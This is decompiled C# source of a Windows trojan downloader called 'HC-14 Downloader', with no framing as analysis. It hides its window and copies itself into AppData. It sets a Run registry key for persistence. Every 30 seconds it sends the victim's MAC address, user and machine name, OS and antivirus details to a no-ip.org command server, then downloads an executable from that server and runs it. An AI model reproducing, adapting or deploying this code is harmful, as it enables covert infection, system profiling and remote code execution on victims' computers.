using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Downloader.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Downloader;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Versiyon")]
	private Label _Versiyon;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Zaman")]
	private Label _Zaman;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	public string APPPATH;

	public string Ayardosya;

	public string Hedef;

	public string BEN;

	public string OlmamGerekenYer;

	internal virtual Label Versiyon
	{
		[DebuggerNonUserCode]
		get
		{
			return _Versiyon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Versiyon_Click;
			if (_Versiyon != null)
			{
				((Control)_Versiyon).remove_Click(eventHandler);
			}
			_Versiyon = value;
			if (_Versiyon != null)
			{
				((Control)_Versiyon).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Zaman
	{
		[DebuggerNonUserCode]
		get
		{
			return _Zaman;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Zaman = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click_1;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		APPPATH = Application.get_StartupPath();
		Ayardosya = APPPATH + "\\Settings.ini";
		Hedef = "http://useragent.no-ip.org/";
		BEN = Application.get_ExecutablePath();
		OlmamGerekenYer = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Versiyon = new Label();
		Timer1 = new Timer(components);
		Zaman = new Label();
		Button1 = new Button();
		((Control)this).SuspendLayout();
		Label versiyon = Versiyon;
		Point location = new Point(6, 54);
		((Control)versiyon).set_Location(location);
		((Control)Versiyon).set_Name("Versiyon");
		Label versiyon2 = Versiyon;
		Size size = new Size(42, 19);
		((Control)versiyon2).set_Size(size);
		((Control)Versiyon).set_TabIndex(1);
		Versiyon.set_Text("1453");
		Versiyon.set_TextAlign((ContentAlignment)32);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		Label zaman = Zaman;
		location = new Point(6, 5);
		((Control)zaman).set_Location(location);
		((Control)Zaman).set_Name("Zaman");
		Label zaman2 = Zaman;
		size = new Size(42, 20);
		((Control)zaman2).set_Size(size);
		((Control)Zaman).set_TabIndex(2);
		Zaman.set_Text("0");
		Zaman.set_TextAlign((ContentAlignment)32);
		Button button = Button1;
		location = new Point(6, 28);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(42, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Close");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(57, 76);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Zaman);
		((Control)this).get_Controls().Add((Control)(object)Versiyon);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Downloader");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	public object method_0(string Text, int Miktar)
	{
		return Strings.Right(Text, Miktar);
	}

	public object Soldan(string Text, int Miktar)
	{
		return Strings.Left(Text, Miktar);
	}

	public object method_1(object Text, object object_0, object object_1)
	{
		checked
		{
			object objectValue = RuntimeHelpers.GetObjectValue(method_0(Conversions.ToString(Text), Strings.Len(RuntimeHelpers.GetObjectValue(Text)) - Strings.InStr(Conversions.ToString(Text), Conversions.ToString(object_0), (CompareMethod)0) - Strings.Len(RuntimeHelpers.GetObjectValue(object_0)) + 1));
			return RuntimeHelpers.GetObjectValue(Soldan(Conversions.ToString(objectValue), Strings.InStr(Conversions.ToString(objectValue), "]", (CompareMethod)0) - 1));
		}
	}

	public object getMacAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = allNetworkInterfaces[0].GetPhysicalAddress().ToString();
		return Strings.Mid(text, 1, 2) + ":" + Strings.Mid(text, 3, 2) + ":" + Strings.Mid(text, 5, 2) + ":" + Strings.Mid(text, 7, 2) + ":" + Strings.Mid(text, 9, 2) + ":" + Strings.Mid(text, 11, 2);
	}

	public object GETUPDATE()
	{
		WebClient webClient = new WebClient();
		string text = Conversions.ToString(getMacAddress());
		string text2 = Environment.UserName + " [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
		string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)DateAndTime.get_Today().Year, method_0("00" + Conversions.ToString(DateAndTime.get_Today().Month), 2)), method_0("00" + Conversions.ToString(DateAndTime.get_Today().Day), 2)), method_0("00" + Conversions.ToString(DateAndTime.get_TimeOfDay().Hour), 2)), method_0("00" + Conversions.ToString(DateAndTime.get_TimeOfDay().Minute), 2)));
		string text4 = ((!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Application.get_StartupPath() + "\\" + Versiyon.get_Text() + ".exe")) ? "0000" : Versiyon.get_Text());
		string value = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat("MAC=" + text, ";NAME="), text2), ";OS="), Module1.smethod_0()), (object)";SON="), (object)text3), (object)";VERSION="), (object)text4), (object)";AV="), Module1.smethod_1()));
		webClient.Headers["Cookie"] = value;
		return webClient.DownloadString(Hedef + "/CPU.php?MEVZU=UPDATE");
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_2()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		WebClient webClient = default(WebClient);
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		Process[] processesByName2 = default(Process[]);
		Process[] array2 = default(Process[]);
		int num6 = default(int);
		Process process2 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 742:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0023;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_0050;
						case 4:
						case 7:
						case 8:
							goto IL_006d;
						case 9:
							goto IL_007c;
						case 10:
							goto IL_0094;
						case 11:
							goto IL_00af;
						case 12:
							goto IL_00b9;
						case 13:
							goto IL_00dd;
						case 14:
							goto IL_00f0;
						case 15:
							goto IL_0101;
						case 16:
							goto IL_010f;
						case 17:
							goto IL_011b;
						case 18:
							goto IL_012f;
						case 19:
							goto IL_0140;
						case 20:
							goto IL_014e;
						case 21:
							goto IL_0185;
						case 22:
							goto IL_01a3;
						case 23:
							goto IL_01d8;
						case 24:
							goto IL_01fa;
						case 25:
							goto IL_0203;
						case 26:
							goto IL_022d;
						case 27:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 28:
						case 29:
						case 30:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00f0:
					num = 14;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_0101;
					IL_0140:
					num = 19;
					goto IL_0144;
					IL_000a:
					num = 2;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("Settings.ini"))
					{
						goto IL_0023;
					}
					goto IL_004d;
					IL_0023:
					num = 3;
					Versiyon.set_Text(Module1.ReadIni(Ayardosya, "AYARLAR", "Version", "1453"));
					goto IL_006d;
					IL_004d:
					num = 5;
					goto IL_0050;
					IL_0050:
					num = 6;
					Module1.writeIni(Ayardosya, "AYARLAR", "Version", "1453");
					goto IL_006d;
					IL_006d:
					num = 8;
					text = Conversions.ToString(GETUPDATE());
					goto IL_007c;
					IL_007c:
					num = 9;
					if (Strings.InStr(text, "Download", (CompareMethod)0) == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0094;
					IL_0094:
					num = 10;
					text2 = Conversions.ToString(method_1(text, "Download=[", "]"));
					goto IL_00af;
					IL_00af:
					num = 11;
					webClient = new WebClient();
					goto IL_00b9;
					IL_00b9:
					num = 12;
					processesByName = Process.GetProcessesByName(Conversions.ToString(Conversion.Int(Conversions.ToDouble(text2) - 1.0)));
					goto IL_00dd;
					IL_00dd:
					num = 13;
					array = processesByName;
					num5 = 0;
					goto IL_0105;
					IL_0105:
					if (num5 < array.Length)
					{
						process = array[num5];
						goto IL_00f0;
					}
					goto IL_010f;
					IL_010f:
					num = 16;
					processesByName2 = Process.GetProcessesByName(text2);
					goto IL_011b;
					IL_011b:
					num = 17;
					array2 = processesByName2;
					num6 = 0;
					goto IL_0144;
					IL_0144:
					if (num6 < array2.Length)
					{
						process2 = array2[num6];
						goto IL_012f;
					}
					goto IL_014e;
					IL_014e:
					num = 20;
					FileSystem.Kill(Application.get_StartupPath() + "\\" + Conversions.ToString(Conversion.Int(Conversions.ToDouble(text2) - 1.0)) + ".exe");
					goto IL_0185;
					IL_0185:
					num = 21;
					FileSystem.Kill(Application.get_StartupPath() + "\\" + text2 + ".exe");
					goto IL_01a3;
					IL_01a3:
					num = 22;
					webClient.DownloadFile(Hedef + "/Servers/" + text2 + ".hc14", Application.get_StartupPath() + "\\" + text2 + ".exe");
					goto IL_01d8;
					IL_01d8:
					num = 23;
					Interaction.Shell(Application.get_StartupPath() + "\\" + text2 + ".exe", (AppWinStyle)1, false, -1);
					goto IL_01fa;
					IL_01fa:
					num = 24;
					Application.DoEvents();
					goto IL_0203;
					IL_0203:
					num = 25;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Application.get_StartupPath() + "\\" + text2 + ".exe"))
					{
						goto end_IL_0001_3;
					}
					goto IL_022d;
					IL_022d:
					num = 26;
					Versiyon.set_Text(text2);
					break;
					IL_0101:
					num = 15;
					goto IL_0105;
					IL_012f:
					num = 18;
					process2.Kill();
					num6 = checked(num6 + 1);
					goto IL_0140;
					end_IL_0001_2:
					break;
				}
				num = 27;
				Module1.writeIni(Ayardosya, "AYARLAR", "Version", text2);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 742;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		string[] commandLineArgs = default(string[]);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					num = 1;
					Point location = new Point(-300, -500);
					((Form)this).set_Location(location);
					goto IL_001d;
				}
				case 388:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_001d;
						case 3:
							goto IL_0026;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_0053;
						case 8:
							goto IL_0068;
						case 9:
							goto IL_007f;
						case 12:
							goto IL_008e;
						case 13:
							goto IL_0092;
						case 14:
							goto IL_00da;
						case 15:
							goto IL_010d;
						case 16:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 10:
						case 11:
						case 17:
						case 18:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_010d:
					num = 15;
					Interaction.Shell(text, (AppWinStyle)0, false, -1);
					break;
					IL_00da:
					num = 14;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HC-14 C System", (object)("\"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\HC-14 Downloader.exe\" -Yerimdeyim"));
					goto IL_010d;
					IL_001d:
					num = 2;
					commandLineArgs = Environment.GetCommandLineArgs();
					goto IL_0026;
					IL_0026:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_002f;
					IL_002f:
					num = 4;
					text2 = commandLineArgs[1];
					goto IL_0036;
					IL_0036:
					num = 5;
					if (Strings.InStr(text2, "Yerimdeyim", (CompareMethod)0) != 0)
					{
						goto IL_004a;
					}
					goto IL_008e;
					IL_004a:
					num = 6;
					((Control)this).Hide();
					goto IL_0053;
					IL_0053:
					num = 7;
					Interaction.MsgBox((object)"System have been complated successfuly", (MsgBoxStyle)64, (object)"OK");
					goto IL_0068;
					IL_0068:
					num = 8;
					if (!((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
					{
						goto end_IL_0001_3;
					}
					goto IL_007f;
					IL_007f:
					num = 9;
					method_2();
					goto end_IL_0001_3;
					IL_008e:
					num = 12;
					goto IL_0092;
					IL_0092:
					num = 13;
					text = "cmd.exe /c copy \"" + Assembly.GetExecutingAssembly().Location + "\" \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\HC-14 Downloader.exe\"";
					goto IL_00da;
					end_IL_0001_2:
					break;
				}
				num = 16;
				((Form)this).Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 388;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Label zaman = Zaman;
		zaman.set_Text(Conversions.ToString(Conversions.ToDouble(zaman.get_Text()) + 1.0));
		if (Operators.CompareString(Zaman.get_Text(), "30", false) == 0)
		{
			if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
			{
				method_2();
			}
			Zaman.set_Text(Conversions.ToString(0));
		}
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void Versiyon_Click(object sender, EventArgs e)
	{
	}

	private void method_3(object sender, EventArgs e)
	{
	}
}
